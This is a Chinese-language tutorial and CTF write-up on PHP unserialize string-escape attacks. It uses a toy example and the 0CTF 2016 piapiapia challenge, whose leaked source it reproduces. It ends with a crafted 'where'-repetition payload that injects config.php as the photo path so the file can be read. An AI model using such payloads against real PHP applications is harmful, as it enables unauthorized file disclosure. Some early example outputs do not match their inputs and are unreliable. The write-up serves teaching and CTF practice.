# `PHP`反序列化尾部字符逃逸学习

## 什么是`php`反序列化尾部字符逃逸

看下面的代码：

```php
<?php
	$username = "zeng";
	$password = "12345";
	$user = array($username, $password);
	$ser = serialize($user);
	var_dump($ser);
	echo "\n";
	var_dump(unserialize($ser));
?>	
```

执行结果如下：

```php
string(37) "a:2:{i:0;s:7:"zeng";i:1;s:5:"12345";}"

array(2) {
  [0]=>
  string(7) "su29029"
  [1]=>
  string(5) "12345"
}
```

反序列化正常返回了一个array对象。如果我们我们此时在**;}**后面再加一些内容，例如：

```php
<?php
	$a = 'a:2:{i:0;s:4:"zeng";i:1;s:5:"12345";}s:5:"admin";s:5:"hhh";}'
```

执行结果如下：

```php
array(2){
	[0]=>
	string(4) "zeng"
	[1]=>(5) "12345"
}
```

我们发现**;}**后面的内容被忽略掉了。`php`底层在作反序列化的时候会根据**;**来判断字段的分割，以**}**作为结尾（字符串内的除外），并且会根据长度判断内容。故上面那个例子中**}**后的内容被忽略掉了。

如果设置了一个非正常长度的字节序列呢？例如我们把上面例子中代表字符串长度的数字改一下，会发生什么？

```php
<?php 
	$a = 'a:2:{i:0;s:6:"zeng";i:1;s:5:"12345";}s:5:"admin";s:5:"hhh";}'
?>
```

执行结果：

> PHP Notice:  unserialize(): Error at offset 19 of 63 bytes in /home/php/4.php on line 3
> bool(false)

发现报错了，而且只要标记的字符串长度不等于字符串的真实长度就会报错。

```php
<?php
include "flag.php";
function filter($string){
        return str_replace('m','aa',$string);
}
        $username=$argv[1];//read from cmd line  e.g. php 1.php "abc"
        $password="12345";
        $user = array($username, $password);
        $serial = serialize($user);
        var_dump($serial);
        $filt = filter($serial);
        var_dump($filt);
        var_dump(unserialize($filt));
        $res = unserialize($filt);
        if ($res[1] === "000000"){ //$res[1] is password.
                echo $flag;
        } else {
                echo "failed.";
        }
?>
```

我们先随便输入一个字符串：`zeng`

执行结果：

```php
string(37) "a:2:{i:0;s:7:"zeng";i:1;s:5:"12345";}"
string(37) "a:2:{i:0;s:7:"zeng";i:1;s:5:"12345";}"
array(2) {
  [0]=>
  string(4) "zeng"
  [1]=>
  string(5) "12345"
}
failed.
```

发现反序列化成功。如果输入一个会被替换的字符串则会报错：

> zengmmmm

执行结果：

```php
string(42) "a:2:{i:0;s:11:"zengmmmm";i:1;s:5:"12345";}"
string(46) "a:2:{i:0;s:11:"zengaaaaaaaa";i:1;s:5:"12345";}"
PHP Notice:  unserialize(): Error at offset 26 of 49 bytes in /home/php/1.php on line 13
bool(false)
PHP Notice:  unserialize(): Error at offset 26 of 49 bytes in /home/php/1.php on line 14
PHP Notice:  Trying to access array offset on value of type bool in /home/php/1.php on line 15
failed.
```

注意到一个细节，被替换后的是序列化的字符串，替换后字符串边长，s值依然是11，所以报错了。

然后换个输出，发现了一些特殊的结果：

> zengmmm";}

执行结果有了一些变化：

```php
string(44) "a:2:{i:0;s:10:"zengmmm";}";i:1;s:5:"12345";}"
string(47) "a:2:{i:0;s:10:"zengaaaaaa";}";i:1;s:5:"12345";}"
PHP Notice:  unserialize(): Unexpected end of serialized data in /home/php/1.php on line 13
PHP Notice:  unserialize(): Error at offset 30 of 50 bytes in /home/php/1.php on line 13
bool(false)
PHP Notice:  unserialize(): Unexpected end of serialized data in /home/php/1.php on line 14
PHP Notice:  unserialize(): Error at offset 30 of 50 bytes in /home/php/1.php on line 14
PHP Notice:  Trying to access array offset on value of type bool in /home/php/1.php on line 15
failed.
```

我们看到序列化前的字符串的长度是13位，而被替换后的字符串也是13位，后面的`;}`将字符串闭合了，导致后面的内容失效，反序列化提前结束，而前面的`a:2`却表明数组长度为2，所以提示“非预期的序列化数据结尾”。

那么这个时候我们构造如下`payload`：

> zengmmmmmmmmmmmmmmmmmmmm\";i:1;s:6:\"000000\";}
>

执行结果：

> string(88) "a:2:{i:0;s:44:"zengmmmmmmmmmmmmmmmmmmmm";i:1;s:6:"000000";}";i:1;s:5:"12345";}"
> string(98) "a:2:{i:0;s:44:"zengaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";i:1;s:6:"000000";}";i:1;s:5:"12345";}"
> array(2) {
>   [0]=>
>   string(44) "zengaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
>   [1]=>
>   string(6) "000000"
> }
> flag{123456}

根据上一个输入，我们发现原理相同，通过`;}`闭合序列化字符串，并且巧妙利用替换操作使得替换后的`'"'`前的字符串长度刚好等于替换前的全部字符串长度，从而成功的让`password`变成了`000000`。

## [0CTF 2016]piapiapia解题思路

这道题存在源码泄露**`www.zip`**

拿到了五个文件

**`index.php`**

```php
<?php
	require_once('class.php');
	if($_SESSION['username']) {
		header('Location: profile.php');
		exit;
	}
	if($_POST['username'] && $_POST['password']) {
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strlen($username) < 3 or strlen($username) > 16) 
			die('Invalid user name');

		if(strlen($password) < 3 or strlen($password) > 16) 
			die('Invalid password');

		if($user->login($username, $password)) {
			$_SESSION['username'] = $username;
			header('Location: profile.php');
			exit;	
		}
		else {
			die('Invalid user name or password');
		}
	}
	else {
?>
<html>
......[省略html代码]
</html>
<?php
	}
?>
```

**`class.php`**

```php
<?php
require('config.php');

class user extends mysql{
	private $table = 'users';

	public function is_exists($username) {
		$username = parent::filter($username);

		$where = "username = '$username'";
		return parent::select($this->table, $where);
	}
	public function register($username, $password) {
		$username = parent::filter($username);
		$password = parent::filter($password);

		$key_list = Array('username', 'password');
		$value_list = Array($username, md5($password));
		return parent::insert($this->table, $key_list, $value_list);
	}
	public function login($username, $password) {
		$username = parent::filter($username);
		$password = parent::filter($password);

		$where = "username = '$username'";
		$object = parent::select($this->table, $where);
		if ($object && $object->password === md5($password)) {
			return true;
		} else {
			return false;
		}
	}
	public function show_profile($username) {
		$username = parent::filter($username);

		$where = "username = '$username'";
		$object = parent::select($this->table, $where);
		return $object->profile;
	}
	public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}
	public function __tostring() {
		return __class__;
	}
}

class mysql {
	private $link = null;

	public function connect($config) {
		$this->link = mysql_connect(
			$config['hostname'],
			$config['username'], 
			$config['password']
		);
		mysql_select_db($config['database']);
		mysql_query("SET sql_mode='strict_all_tables'");

		return $this->link;
	}

	public function select($table, $where, $ret = '*') {
		$sql = "SELECT $ret FROM $table WHERE $where";
		$result = mysql_query($sql, $this->link);
		return mysql_fetch_object($result);
	}

	public function insert($table, $key_list, $value_list) {
		$key = implode(',', $key_list);
		$value = '\'' . implode('\',\'', $value_list) . '\''; 
		$sql = "INSERT INTO $table ($key) VALUES ($value)";
		return mysql_query($sql);
	}

	public function update($table, $key, $value, $where) {
		$sql = "UPDATE $table SET $key = '$value' WHERE $where";
		return mysql_query($sql);
	}

	public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
	public function __tostring() {
		return __class__;
	}
}
session_start();
$user = new user();
$user->connect($config);
```

**`register.php`**

```php
<?php
	require_once('class.php');
	if($_POST['username'] && $_POST['password']) {
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strlen($username) < 3 or strlen($username) > 16) 
			die('Invalid user name');

		if(strlen($password) < 3 or strlen($password) > 16) 
			die('Invalid password');
		if(!$user->is_exists($username)) {
			$user->register($username, $password);
			echo 'Register OK!<a href="index.php">Please Login</a>';		
		}
		else {
			die('User name Already Exists');
		}
	}
	else {
?>
<html>
......[省略html代码]
</html>
<?php
	}
?>
```

**`update.php`**

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');

		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
	else {
?>
<html>
......[省略html代码]
</html>
<?php
	}
?>
```

**`profile.php`**

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
?>
<html>
......[省略html代码]
</html>
<?php
	}
?>
```

**`config.php`**

```php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
```

这个时候仔细审计代码，发现`profile.php`中有一个`file_get_contents`函数，同时发现了序列化和反序列化，序列化内容可控，这个时候可以考虑通过反序列化将`$profile`中的`photo`属性改变为`config.php`。

这个时候目标明确了，仔细审计`update.php`代码，发现有几个过滤，先是对输入的内容格式进行正则匹配，随后将输入的前三项内容和第四项内容的上传路径进行序列化，随后传给`update_profile`函数进行处理，跟进`update_profile`发现对`$username`和`$profile`进行过滤，跟进`filter`函数发现会将`**'**`和**\\\\**替换为**_**，并将`'select''insert''update''delete''where'`替换为`'hacker'`。这个时候我们发现了重点：`filter`函数会将`where`替换成`hacker`，替换后字符串的长度发生了改变，而序列化字符串中长度未改变，这个时候我们就可以通过反序列化字符串逃逸来实现将`file_get_contents`中的内容替换为`config.php`

但是我们需要先绕过第一个正则匹配

所以我们只要将`nickname`替换成数组即可。

构造`payload`：

```php
nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```